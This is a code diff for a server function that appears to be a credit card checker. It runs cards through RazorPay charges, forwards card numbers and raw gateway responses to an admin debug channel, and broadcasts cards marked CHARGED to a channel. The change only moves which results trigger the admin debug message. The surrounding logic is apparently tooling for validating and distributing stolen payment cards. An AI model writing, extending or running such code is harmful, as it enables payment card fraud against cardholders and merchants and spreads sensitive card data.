@@ -282,17 +282,15 @@ serve(async (req) => {
       displayStatus = 'UNKNOWN';
     }
     
-    // Send debug to admin for all results
-    sendAdminDebug(
-      cc,
-      result.status,
-      result.message,
-      result.rawResponse,
-      profile?.username || user.email
-    );
-    
-    // Broadcast CHARGED cards to channel
+    // CHARGED: admin debug + broadcast to channel + notify user
     if (result.status === 'live') {
+      sendAdminDebug(
+        cc,
+        result.status,
+        result.message,
+        result.rawResponse,
+        profile?.username || user.email
+      );
       notifyChargedCard(
         user.id,
         cc,
@@ -300,6 +298,16 @@ serve(async (req) => {
         result.message,
         'RazorPay',
         'RazorPay Charge'
+      );
+    }
+    // UNKNOWN: admin debug only
+    else if (computedStatus === 'unknown') {
+      sendAdminDebug(
+        cc,
+        result.status,
+        result.message,
+        result.rawResponse,
+        profile?.username || user.email
       );
     }
     
